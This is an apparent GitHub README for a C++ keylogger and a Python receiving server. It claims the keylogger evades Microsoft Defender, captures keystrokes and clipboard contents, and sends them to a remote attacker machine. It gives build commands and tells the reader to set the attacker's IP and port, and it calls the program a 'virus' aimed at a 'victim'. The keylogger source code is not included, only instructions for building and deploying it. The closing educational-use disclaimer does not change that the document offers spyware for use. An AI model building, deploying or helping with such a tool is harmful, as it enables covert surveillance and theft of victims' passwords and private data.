# A simple Keylogger bypass Microsoft Window Defender

A simple Keylogger written in C++, and listening server written in Python.
Keylogger will capture any press keystroke (note that I just concentrate on key which can display):
- Normal key: a,b,c,1,2,3,...
- Some special char like , . ; { } ` ....
- Characters cannot be displayed like [ENTER] [ALT] [BACKSPACE]
and also capture the latest record on clipboard comprising of images or text.
All data will be saved on memory and delivered to the remote-specified machine instead of creating log file on the local victim machine.
It is not detected by MDE (tested on 8/20/2024 : Windows 10 22H2 latest)
## I. Installation

- ***Mingw***:
    *note that I tried to use Microsoft Visual Studio to build exe but I got a lot of errors with lib and header files, you can use MVS if you want, or install Mingw like me*

```bash
sudo apt-get update
sudo apt-get install mingw-w64 -y
```
## II. Usage
### 1. Build virus
***Note:*** *Inspect source in virus.cpp and change sourceip and port to your remote server that hosts server.py (receive shell from victim) then build it using mingw*
```bash
x86_64-w64-mingw32-g++ -o logger.exe mainkeylogger.cpp -static-libgcc -static-libstdc++ -luser32 -lwininet
```

### 2. Run listening server
***Note:*** *This server.py will listen incomming POST request, log any data to log folder*
```python
python3 server.py
```

**Server**:

![plot](./images/server.png)

**Client**

![plot](./images/client.png)

> [!CAUTION]
> There is no clean code, no penetration test provided, this repo is for educational purposes only. Do not use for illegal purposes. I'm never responsible for illegal use. Educational purpose only!
## Support me (optional)
If you find it useful, you can support me with a cup of coffee.
[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/Y8Y2123O0D)
